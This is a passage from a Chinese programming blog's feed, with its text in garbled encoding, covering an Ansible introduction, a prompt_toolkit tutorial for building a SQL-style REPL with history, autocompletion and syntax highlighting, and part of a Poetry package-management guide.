        <content type="html"><![CDATA[<h2 id="ansible-è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ç®±"><a href="#ansible-è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ç®±" class="headerlink" title="ansible è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ç®±"></a>ansible <strong>è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ç®±</strong></h2><ul><li><a href="https://segmentfault.com/a/1190000038230424">å¿«é€Ÿä¸Šæ‰‹</a></li><li><a href="https://github.com/ansible/ansible">Github</a></li><li><a href="https://ansible-tran.readthedocs.io/en/latest/">å®˜æ–¹ä¸­æ–‡æ–‡æ¡£</a></li></ul><p>Ansible æ˜¯ä¸€ä¸ªé…ç½®ç®¡ç†å’Œé…ç½®å·¥å…·ï¼Œç±»ä¼¼äº Chefï¼ŒPuppet æˆ– Saltã€‚è¿™æ˜¯ä¸€æ¬¾å¾ˆç®€å•ä¹Ÿå¾ˆå®¹æ˜“å…¥é—¨çš„éƒ¨ç½²å·¥å…·ï¼Œå®ƒä½¿ç”¨ SSH è¿æ¥åˆ°æœåŠ¡å™¨å¹¶è¿è¡Œé…ç½®å¥½çš„ä»»åŠ¡ï¼ŒæœåŠ¡å™¨ä¸Šä¸ç”¨å®‰è£…ä»»ä½•å¤šä½™çš„è½¯ä»¶ï¼Œåªéœ€è¦å¼€å¯ sshï¼Œæ‰€æœ‰å·¥ä½œéƒ½äº¤ç»™ client ç«¯çš„ ansible è´Ÿè´£ã€‚</p><p>å…³äº Ansible çš„ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå°† bash è„šæœ¬è½¬æ¢ä¸ºå¯æ‰§è¡Œä»»åŠ¡æ˜¯éå¸¸å®¹æ˜“çš„ã€‚æˆ‘ä»¬å¯ä»¥ç¼–å†™è‡ªå·±çš„é…ç½®ç¨‹åºï¼Œä½†æ˜¯ Ansible æ›´åŠ å¹²å‡€ï¼Œå› ä¸ºå®ƒå¯ä»¥è‡ªåŠ¨åœ¨æ‰§è¡Œä»»åŠ¡ä¹‹å‰è·å–ä¸Šä¸‹æ–‡ã€‚ansible ä»»åŠ¡æ˜¯å¹‚ç­‰çš„ï¼Œæ²¡æœ‰å¤§é‡é¢å¤–çš„ç¼–ç ï¼Œansible å¯ä»¥ä¸€æ¬¡åˆä¸€æ¬¡åœ°å®‰å…¨è¿ï¼Œè€Œ bash å‘½ä»¤è¿™ç§å¹‚ç­‰æ€§ã€‚</p><p>ansible ä½¿ç”¨ â€œfactsâ€ æ¥ç¡®ä¿ä»»åŠ¡çš„å¹‚ç­‰å®‰å…¨è¿è¡Œï¼Œ å®ƒæ˜¯åœ¨è¿è¡Œä»»åŠ¡ä¹‹å‰æ”¶é›†çš„ç³»ç»Ÿå’Œç¯å¢ƒä¿¡æ¯ã€‚ansible ä½¿ç”¨è¿™äº› facts æ¥æ£€æŸ¥çŠ¶æ€ï¼Œçœ‹çœ‹æ˜¯å¦éœ€è¦æ”¹å˜æŸäº›ä¸œè¥¿ä»¥è·å¾—æ‰€éœ€çš„ç»“æœã€‚è¿™ä½¿å¾— ansible å¯ä»¥è®©æœåŠ¡å™¨ä¸€æ¬¡åˆä¸€æ¬¡åœ°è¿è¡Œå¯å¤åˆ¶çš„ä»»åŠ¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> todo </tag>
            
            <tag> æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªæç®€çš„REPLäº¤äº’ç¤ºèŒƒ</title>
      <link href="/2022/03/01/%E4%B8%80%E4%B8%AA%E6%9E%81%E7%AE%80%E7%9A%84REPL%E4%BA%A4%E4%BA%92%E7%A4%BA%E8%8C%83/"/>
      <url>/2022/03/01/%E4%B8%80%E4%B8%AA%E6%9E%81%E7%AE%80%E7%9A%84REPL%E4%BA%A4%E4%BA%92%E7%A4%BA%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ä¸ªå¥½çš„REPL(Read-Eval-Print Loop)ï¼Œäº¤äº’å¼å‘½ä»¤è¡Œç¨‹åºï¼Œéœ€è¦å…·å¤‡ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š</p><ol><li>æœ€åŸºæœ¬çš„å‘½ä»¤è¡Œä¸å›æ˜¾</li><li>å›æ˜¾å¸¦æœ‰åˆ†é¡µæ•ˆæœï¼Œç±»ä¼¼ more</li><li>å¸¦æœ‰å†å²å‘½ä»¤æ¨è</li><li>å…³é”®è¯è‡ªåŠ¨è¡¥å…¨</li><li>è¯­æ³•é«˜äº®</li></ol><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>æˆ‘ä»¬ä»¥æ¨¡æ‹ŸSqlçš„REPLæ¥å°†è¿™äº›ç‰¹æ€§ä¸€ç‚¹ç‚¹æ¥ç´¯åŠ èµ·æ¥</p><h3 id="åŸºæœ¬å‘½ä»¤è¡Œä¸å›æ˜¾"><a href="#åŸºæœ¬å‘½ä»¤è¡Œä¸å›æ˜¾" class="headerlink" title="åŸºæœ¬å‘½ä»¤è¡Œä¸å›æ˜¾"></a>åŸºæœ¬å‘½ä»¤è¡Œä¸å›æ˜¾</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(user_input)</span></code></pre></div></div><h3 id="æ·»åŠ åˆ†é¡µæ•ˆæœ"><a href="#æ·»åŠ åˆ†é¡µæ•ˆæœ" class="headerlink" title="æ·»åŠ åˆ†é¡µæ•ˆæœ"></a>æ·»åŠ åˆ†é¡µæ•ˆæœ</h3><p>ä½¿ç”¨çš„æ˜¯<code>click.echo_via_pager</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line marked"><span class="hljs-keyword">import</span> click</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</span><span class="line marked">    click.echo_via_pager(user_input)</span></code></pre></div></div><h3 id="å†å²å‘½ä»¤æ¨è"><a href="#å†å²å‘½ä»¤æ¨è" class="headerlink" title="å†å²å‘½ä»¤æ¨è"></a>å†å²å‘½ä»¤æ¨è</h3><p>ä½¿ç”¨çš„æ˜¯ <code>prompt_toolkit.history</code> æ¨¡å—ä¸­çš„ <code>FileHistory</code><br>ä¼šåˆ›å»ºä¸€ä¸ªå†å²è®°å½•çš„æ–‡ä»¶ï¼Œç„¶åé€šè¿‡<code>prompt_toolkit.auto_suggest.AutoSugguestFromHistory</code>è¿›è¡Œæ¨èã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>,</span><span class="line marked">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line marked">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div><h3 id="å…³é”®è¯è¡¥å…¨"><a href="#å…³é”®è¯è¡¥å…¨" class="headerlink" title="å…³é”®è¯è¡¥å…¨"></a>å…³é”®è¯è¡¥å…¨</h3><p>å…³é”®è¯è¡¥å…¨æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ol><li>ç”¨<code>prompt_toolkit.completion.WordCompleter</code> ç›´æ¥å®šä¹‰å•è¯</li><li>ç”¨<code>prompt_toolkit.completion</code> ä¸­çš„ <code>Completer</code> å’Œ <code>Completion</code>é…åˆ<code>fuzzyfinder</code>è¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ï¼Œè¿™ç§æ–¹æ³•è‡ªå®šä¹‰ç¨‹åº¦æ›´é«˜</li></ol><h4 id="WordCompleter"><a href="#WordCompleter" class="headerlink" title="WordCompleter"></a>WordCompleter</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.completion <span class="hljs-keyword">import</span> WordCompleter</span><span class="line marked"></br></span><span class="line marked">SQLCompleter = WordCompleter(</span><span class="line marked">    [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>], ignore_case=<span class="hljs-literal">True</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>,</span><span class="line">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line marked">                        completer=SQLCompleter,</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div><h4 id="fuzzyfinder"><a href="#fuzzyfinder" class="headerlink" title="fuzzyfinder"></a>fuzzyfinder</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.completion <span class="hljs-keyword">import</span> Completer, Completion</span><span class="line marked"><span class="hljs-keyword">from</span> fuzzyfinder.main <span class="hljs-keyword">import</span> fuzzyfinder</span><span class="line marked"></br></span><span class="line marked">SQLKeywords = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>]</span><span class="line marked"></br></span><span class="line marked"></br></span><span class="line marked"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQLCompleter</span>(<span class="hljs-params">Completer</span>):</span></span><span class="line marked">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_completions</span>(<span class="hljs-params">self, document, complete_event</span>):</span></span><span class="line marked">        word_before_cursor = document.get_word_before_cursor(WORD=<span class="hljs-literal">True</span>)</span><span class="line marked">        matches = fuzzyfinder(word_before_cursor, SQLKeywords)</span><span class="line marked">        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> matches:</span><span class="line marked">            <span class="hljs-keyword">yield</span> Completion(m, start_position=-<span class="hljs-built_in">len</span>(word_before_cursor))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;&gt;&#x27;</span>,</span><span class="line">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line marked">                        completer=SQLCompleter(),</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div><h3 id="è¯­æ³•é«˜äº®"><a href="#è¯­æ³•é«˜äº®" class="headerlink" title="è¯­æ³•é«˜äº®"></a>è¯­æ³•é«˜äº®</h3><p>é«˜äº®å¯ä»¥ä½¿ç”¨<code>Pygments.lexers</code> æ¨¡å—</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit <span class="hljs-keyword">import</span> prompt</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.history <span class="hljs-keyword">import</span> FileHistory</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.auto_suggest <span class="hljs-keyword">import</span> AutoSuggestFromHistory</span><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line"><span class="hljs-keyword">from</span> prompt_toolkit.completion <span class="hljs-keyword">import</span> Completer, Completion</span><span class="line"><span class="hljs-keyword">from</span> fuzzyfinder.main <span class="hljs-keyword">import</span> fuzzyfinder</span><span class="line marked"><span class="hljs-keyword">from</span> pygments.lexers.sql <span class="hljs-keyword">import</span> SqlLexer</span><span class="line marked"><span class="hljs-keyword">from</span> prompt_toolkit.lexers <span class="hljs-keyword">import</span> PygmentsLexer</span><span class="line"></br></span><span class="line">SQLKeywords = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>]</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQLCompleter</span>(<span class="hljs-params">Completer</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_completions</span>(<span class="hljs-params">self, document, complete_event</span>):</span></span><span class="line">        word_before_cursor = document.get_word_before_cursor(WORD=<span class="hljs-literal">True</span>)</span><span class="line">        matches = fuzzyfinder(word_before_cursor, SQLKeywords)</span><span class="line">        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> matches:</span><span class="line">            <span class="hljs-keyword">yield</span> Completion(m, start_position=-<span class="hljs-built_in">len</span>(word_before_cursor))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><span class="line">    user_input = prompt(<span class="hljs-string">&#x27;SQL&gt;&#x27;</span>,</span><span class="line">                        history=FileHistory(<span class="hljs-string">&#x27;history.txt&#x27;</span>),</span><span class="line">                        auto_suggest=AutoSuggestFromHistory(),</span><span class="line">                        completer=SQLCompleter(),</span><span class="line marked">                        lexer=PygmentsLexer(SqlLexer)</span><span class="line">                        )</span><span class="line">    click.echo_via_pager(user_input)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>poetry åŒ…ç®¡ç†ä½¿ç”¨æ–¹æ³•</title>
      <link href="/2022/02/24/poetry-%E5%8C%85%E7%AE%A1%E7%90%86%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/02/24/poetry-%E5%8C%85%E7%AE%A1%E7%90%86%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="poetry-æ˜¯ä»€ä¹ˆ"><a href="#poetry-æ˜¯ä»€ä¹ˆ" class="headerlink" title="poetry æ˜¯ä»€ä¹ˆ"></a>poetry æ˜¯ä»€ä¹ˆ</h2><p>poetry æ˜¯ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒå’ŒåŒ…ç®¡ç†çš„å·¥å…·ï¼Œå¹¶ä¸”è¿˜æ”¯æŒæ‰“åŒ…å’Œå‘å¸ƒã€‚<br>å¯ä»¥ç”¨æ¥ç®¡ç†pythonåº“å’Œpythonç¨‹åºã€‚</p><h2 id="åŠŸèƒ½ä»‹ç»"><a href="#åŠŸèƒ½ä»‹ç»" class="headerlink" title="åŠŸèƒ½ä»‹ç»"></a>åŠŸèƒ½ä»‹ç»</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">pip install poetry</span></code></pre></div></div><p>å®‰è£…åæ£€æŸ¥ç‰ˆæœ¬</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ada codeBlockLines"><span class="line">poetry <span class="hljs-comment">--version </span></span></code></pre></div></div><h3 id="åˆå§‹åŒ–é¡¹ç›®"><a href="#åˆå§‹åŒ–é¡¹ç›®" class="headerlink" title="åˆå§‹åŒ–é¡¹ç›®"></a>åˆå§‹åŒ–é¡¹ç›®</h3><ul><li>åœ¨å·²æœ‰é¡¹ç›®ä¸­</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry init</span></code></pre></div></div><ul><li>æ–°å»ºä¸€ä¸ªé¡¹ç›®</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry new new_project</span><span class="line">poetry new --src new_project <span class="hljs-comment"># å°†æºç æ”¾åœ¨srcç›®å½•ä¸‹</span></span></code></pre></div></div><p>åˆå§‹é¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">.</span><span class="line">â”œâ”€â”€ poetry.lock</span><span class="line">â”œâ”€â”€ pyproject.toml</span><span class="line">â”œâ”€â”€ README.rst</span><span class="line">â”œâ”€â”€ rick_portal_gun</span><span class="line">â”‚Â Â  â””â”€â”€ __init__.py</span><span class="line">â””â”€â”€ tests</span><span class="line">    â”œâ”€â”€ __init__.py</span><span class="line">    â””â”€â”€ test_rick_portal_gun.py</span></code></pre></div></div><ul><li><code>README.rst</code> å»ºè®®æ”¹æˆ <code>.md</code></li><li><code>pyproject.toml</code> æ­¤æ–‡ä»¶ç®¡ç†ä¾èµ–åˆ—è¡¨å’Œé¡¹ç›®çš„å„ç§ meta ä¿¡æ¯ï¼Œç”¨æ¥æ›¿ä»£ Pipfileã€requirements.txtã€setup.pyã€setup.cfgã€MANIFEST.in ç­‰ç­‰å„ç§é…ç½®æ–‡ä»¶ã€‚</li></ul><h3 id="pyproject-toml-æ–‡ä»¶"><a href="#pyproject-toml-æ–‡ä»¶" class="headerlink" title="pyproject.toml æ–‡ä»¶"></a><code>pyproject.toml</code> æ–‡ä»¶</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ini codeBlockLines"><span class="line"><span class="hljs-section">[tool.poetry]</span></span><span class="line"><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;elin-portal-gun&quot;</span>  <span class="hljs-comment"># Require  è½¯ä»¶åç§°</span></span><span class="line"><span class="hljs-attr">version</span> = <span class="hljs-string">&quot;0.1.0&quot;</span> <span class="hljs-comment"># Require  è½¯ä»¶ç‰ˆæœ¬</span></span><span class="line"><span class="hljs-attr">description</span> = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># Require  æè¿°</span></span><span class="line"><span class="hljs-attr">authors</span> = [<span class="hljs-string">&quot;Elin &lt;365433079@qq.com&gt;&quot;</span>]  <span class="hljs-comment"># Require ä½œè€…</span></span><span class="line"><span class="hljs-attr">readme</span> = <span class="hljs-string">&quot;README.md&quot;</span>  <span class="hljs-comment">#  README.rst æˆ–è€… README.md</span></span><span class="line"><span class="hljs-attr">license</span> = <span class="hljs-string">&quot;GPL-3.0-or-later&quot;</span>  </span><span class="line"><span class="hljs-attr">maintainers</span> = [<span class="hljs-string">&quot;&quot;</span>]  <span class="hljs-comment"># ç»´æŠ¤è€…</span></span><span class="line"><span class="hljs-attr">homepage</span> = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># é¡¹ç›®URLåœ°å€</span></span><span class="line"><span class="hljs-attr">repository</span> = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># é¡¹ç›®ä»“åº“URLåœ°å€</span></span><span class="line"><span class="hljs-attr">documentation</span> = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># é¡¹ç›®æ–‡æ¡£URLåœ°å€</span></span><span class="line"><span class="hljs-attr">keywords</span> = [<span class="hljs-string">&quot;&quot;</span>] <span class="hljs-comment"># é¡¹ç›®æ ‡ç­¾ï¼ˆmaxï¼š5ï¼‰</span></span><span class="line"><span class="hljs-attr">classifiers</span> = = [</span><span class="line">    <span class="hljs-string">&quot;Topic :: Software Development :: Build Tools&quot;</span>,</span><span class="line">    <span class="hljs-string">&quot;Topic :: Software Development :: Libraries :: Python Modules&quot;</span></span><span class="line">]  <span class="hljs-comment"># é¡¹ç›®çš„åˆ†ç±» https://pypi.org/classifiers/</span></span><span class="line"><span class="hljs-attr">packages</span> = [</span><span class="line">    &#123; include = <span class="hljs-string">&quot;my_package&quot;</span>, from = <span class="hljs-string">&quot;src&quot;</span>&#125;, <span class="hljs-comment"># å¦‚æœåŒ…åœ¨src/my_packageï¼Œéœ€è¦æŒ‡å®šfrom</span></span><span class="line">    &#123; include = <span class="hljs-string">&quot;extra_package/**/*.py&quot;</span> &#125;,</span><span class="line">] <span class="hljs-comment"># åŒ…å«çš„åŒ…ï¼Œåœ¨æ ‡å‡†æƒ…å†µä¸‹å¯ä»¥ä¸éœ€è¦ï¼Œhttps://python-poetry.org/docs/pyproject/#packages</span></span><span class="line"><span class="hljs-attr">include</span> = [<span class="hljs-string">&quot;&quot;</span>] <span class="hljs-comment"># åŒ…å«çš„æ–‡ä»¶</span></span><span class="line"><span class="hljs-attr">exclude</span> = [<span class="hljs-string">&quot;&quot;</span>] <span class="hljs-comment"># æ’é™¤çš„æ–‡ä»¶</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.scripts]</span> <span class="hljs-comment"># å®‰è£…åè„šæœ¬å¯åŠ¨ç¨‹åºã€‚ </span></span><span class="line"><span class="hljs-attr">elin-portal-gun</span> = <span class="hljs-string">&quot;elin_portal_gun.main:app&quot;</span> <span class="hljs-comment">#è„šæœ¬elin-portal-gunæ‰§è¡Œæ—¶ä¼šå»æ‰¾elin_portal_gunåŒ…ä¸­çš„mainæ–‡ä»¶æ‰§è¡Œapp()</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.dependencies]</span>  <span class="hljs-comment"># ä¾èµ–åŒ…</span></span><span class="line"><span class="hljs-attr">python</span> = <span class="hljs-string">&quot;^3.8&quot;</span></span><span class="line"><span class="hljs-attr">typer</span> = &#123;extras = [<span class="hljs-string">&quot;all&quot;</span>], version = <span class="hljs-string">&quot;^0.4.0&quot;</span>&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.dev-dependencies]</span> <span class="hljs-comment"># å¼€å‘ä¾èµ–åŒ…</span></span><span class="line"><span class="hljs-attr">pytest</span> = <span class="hljs-string">&quot;^5.2&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.extras]</span> <span class="hljs-comment"># å¯é€‰ä¾èµ–ï¼Œå¢å¼ºåŒ…ç­‰</span></span><span class="line"><span class="hljs-attr">mysql</span> = [<span class="hljs-string">&quot;mysqlclient&quot;</span>]</span><span class="line"><span class="hljs-attr">pgsql</span> = [<span class="hljs-string">&quot;psycopg2&quot;</span>]</span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.urls]</span> <span class="hljs-comment"># ä»»ä½•URLï¼Œå½“å‘å¸ƒæ—¶ä¼šæ”¾åœ¨ Project Links ä¸‹é¢</span></span><span class="line"><span class="hljs-attr">&quot;Bug Tracker&quot;</span> = <span class="hljs-string">&quot;https://...&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[build-system]</span> <span class="hljs-comment"># æ„å»ºPythoné¡¹ç›®çš„æ ‡å‡†æ–¹æ³•</span></span><span class="line"><span class="hljs-attr">requires</span> = [<span class="hljs-string">&quot;poetry-core&gt;=1.0.0&quot;</span>]</span><span class="line"><span class="hljs-attr">build-backend</span> = <span class="hljs-string">&quot;poetry.core.masonry.api&quot;</span></span></code></pre></div></div><h3 id="åŒ…ä¾èµ–å…³ç³»æè¿°"><a href="#åŒ…ä¾èµ–å…³ç³»æè¿°" class="headerlink" title="åŒ…ä¾èµ–å…³ç³»æè¿°"></a>åŒ…ä¾èµ–å…³ç³»æè¿°</h3><p><img src="/2022/02/24/poetry-%E5%8C%85%E7%AE%A1%E7%90%86%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/1.png"></p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>æŸ¥çœ‹configé…ç½®</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry config --list</span></code></pre></div></div><p>è®¾ç½®é¡¹ï¼š</p><ul><li><code>cache-dir</code> ç¼“å­˜è·¯å¾„</li><li><code>virtualenvs.create</code> bool  æ˜¯å¦è‡ªåŠ¨åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</li><li><code>virtualenvs.in-project</code> bool/None  </li></ul><p>Noneï¼špoetry ä¼šåœ¨ç³»ç»Ÿç‰¹å®šç›®å½•åˆ›å»ºä¸€ä¸ª.venvç›®å½•ï¼Œç”±ä¸‹é¢çš„ path å‚æ•°æŒ‡å®š<br>trueï¼š poetry ä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ª.venvç›®å½•ï¼Œæˆ‘æ¨èè¿™ç§æ–¹å¼ï¼Œåœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼Œè¿™æ ·å°±ç®—ç§»åŠ¨ç›®å½•ä½ç½®ä¹Ÿä¸å½±å“è™šæ‹Ÿç¯å¢ƒçš„ä½¿ç”¨<br>falseï¼š poetry å°†ä¼šå¿½ç•¥å·²å­˜åœ¨çš„.venvç›®å½•</p><ul><li><code>virtualenvs.path</code> è™šæ‹Ÿç¯å¢ƒè·¯å¾„</li></ul><h3 id="æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ"><a href="#æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ"></a>æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry shell</span></code></pre></div></div><ul><li>æŸ¥çœ‹è™šæ‹Ÿç¯å¢ƒä¿¡æ¯ <code>poetry env info</code></li><li>æŸ¥çœ‹è™šæ‹Ÿç¯å¢ƒåˆ—è¡¨ä»¥åŠè¯¦ç»†è·¯å¾„ <code>poetry env list --full-path</code></li><li>åˆ é™¤è™šæ‹Ÿç¯å¢ƒ <code>poetry env remove python</code></li></ul><h3 id="æ‰§è¡Œè„šæœ¬"><a href="#æ‰§è¡Œè„šæœ¬" class="headerlink" title="æ‰§è¡Œè„šæœ¬"></a>æ‰§è¡Œè„šæœ¬</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry run python app.py</span></code></pre></div></div><p>é™¤äº†ä»¥ä¸Šçš„ä½¿ç”¨è¿˜å¯ä»¥è‡ªå®šä¹‰è„šæœ¬</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-subunit codeBlockLines"><span class="line">[tool.poetry.scripts] </span><span class="line"><span class="hljs-keyword">test </span>= &quot;python test.py&quot; </span><span class="line">serve = &quot;python run.py&quot; </span></code></pre></div></div><p>å¯ä»¥æ‰§è¡Œ<code>poetry run serve</code></p><h3 id="å®‰è£…åŒ…"><a href="#å®‰è£…åŒ…" class="headerlink" title="å®‰è£…åŒ…"></a>å®‰è£…åŒ…</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry add typer[all]</span><span class="line">poetry add pytest --dev  <span class="hljs-comment"># å¼€å‘ä¾èµ–</span></span></code></pre></div></div><h3 id="è¿½è¸ª-amp-æ›´æ–°åŒ…"><a href="#è¿½è¸ª-amp-æ›´æ–°åŒ…" 